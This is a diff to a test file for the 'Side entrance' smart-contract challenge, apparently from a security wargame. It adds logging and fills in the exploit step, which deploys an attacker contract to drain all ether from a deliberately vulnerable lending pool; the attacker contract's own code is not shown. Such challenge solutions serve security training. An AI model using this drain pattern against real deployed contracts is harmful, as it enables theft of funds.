@@ -21,10 +21,19 @@ describe('[Challenge] Side entrance', function () {
         expect(
             await ethers.provider.getBalance(this.pool.address)
         ).to.equal(ETHER_IN_POOL);
+
+        console.log("Deployer: ", deployer.address);
+        console.log("Attacker: ", attacker.address);
+        console.log("Pool:     ", this.pool.address);
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        let attackerContract = await (
+            await ethers.getContractFactory("SideEntranceAttacker", attacker)
+        ).deploy(this.pool.address);
+        await attackerContract.attack(ETHER_IN_POOL);
+        await attackerContract.withdrawLoot(ETHER_IN_POOL);
     });
 
     after(async function () {
@@ -32,7 +41,7 @@ describe('[Challenge] Side entrance', function () {
         expect(
             await ethers.provider.getBalance(this.pool.address)
         ).to.be.equal('0');
-        
+
         // Not checking exactly how much is the final balance of the attacker,
         // because it'll depend on how much gas the attacker spends in the attack
         // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
